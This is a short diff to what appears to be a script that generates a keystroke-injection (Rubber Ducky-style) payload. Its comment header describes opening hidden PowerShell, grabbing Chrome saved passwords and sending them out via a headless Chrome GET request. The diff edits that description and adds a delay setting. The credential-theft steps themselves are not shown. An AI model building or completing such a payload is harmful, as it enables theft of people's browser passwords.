@@ -6,10 +6,11 @@ $outputFile = "payload.txt"
 
 "REM Title: Chrome Exfil",
 "REM Author: Robert Wallhead",
-"REM Description: Opens hidden powershell, grabs Chrome passwords, exfils via Chrome GET request.",
+"REM Description: Opens hidden powershell, grabs Chrome passwords, exfils via headless Chrome GET request.",
 "REM Target: Windows 10 (Powershell + Chrome)",
 "REM Version: 1.0",
 "REM Category: Exfiltration",
+"DEFAULTDELAY 10",
 "DELAY 5000",
 "GUI r",
 "DELAY 250",
